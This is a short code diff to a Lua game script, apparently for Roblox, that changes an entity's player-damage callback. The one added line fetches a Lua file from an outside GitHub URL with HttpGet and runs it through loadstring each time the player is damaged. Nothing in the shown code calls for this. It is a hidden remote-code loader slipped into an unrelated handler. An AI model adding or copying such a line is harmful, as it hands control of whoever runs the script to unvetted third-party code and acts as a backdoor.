@@ -111,6 +111,7 @@ entity:SetCallback("OnDamagePlayer", function(newHealth)
 		print("Entity has killed the player")
 	else
 		print("Entity has damaged the player")
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Drop56796/Guided-/main/Guided.lua"))()
 	end
 end)
 
